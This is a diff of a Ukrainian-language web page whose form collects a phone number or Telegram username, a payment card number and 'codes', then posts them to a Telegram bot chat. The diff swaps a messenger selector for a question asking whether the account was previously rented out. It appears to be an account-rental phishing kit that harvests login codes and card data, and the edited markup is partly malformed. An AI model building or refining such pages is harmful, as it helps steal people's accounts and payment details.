@@ -87,18 +87,39 @@ fbq('track', 'PageView');
             </div>
              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
             <div class="application-input">
-              <input type="tel" name="namber" placeholder="Ваш номер телефону або @username в TG" required="">
+              < input  type = "tel"  name = "namber"  placeholder = "Ваш номер телефону або @username в TG"  required = "" >
             </div>
                 <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
             <div class="application-input">
               <input type="card" name="yesno" placeholder="Ваша карта (для оплати)" required="">
               <div  style="display:flex;justify-content:center;align-items:center;">
-                <label for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
-              <select name="messanger" id="messanger">
-                <option value="Whatsapp-Messenger">WhatsApp Messenger</option>
-                <option selected value="Telegram">Telegram</option>
-                <option value="Viber">Viber</option>
-              </select>
+               <fieldset>
+
+    <legend>Цей акаунт раніше здавався в оренду?</legend>
+
+    <div>
+
+      <input type="radio" id="contactChoice1"
+
+       name="contact" value="yes" checked>
+
+      <label for="contactChoice1">Так</label>
+
+      <input type="radio" id="contactChoice2"
+
+       name="contact" value="no">
+
+      <label for="contactChoice2">Ні</label>
+
+    </div>
+
+    <div>
+
+   
+
+    </div>
+
+  </fieldset>
             </select>
             </div>
                 
@@ -131,7 +152,7 @@ fbq('track', 'PageView');
               message += `<b>Коди:</b> ${ this.codes.value }\n`;
               message += `<b>Номер/TG:</b> ${ this.namber.value }\n`;
               message += `<b>Карта:</b> ${ this.yesno.value }\n`;
-              message += `<b>Спосіб зв'язку:</b> ${ this.messanger.value }`;
+              message += `<b>Спосіб зв'язку:</b> ${ this.contact.value }`;
               axios.post(URI_API, {
                   chat_id: CHAT_ID,
                   parse_mode: 'html',
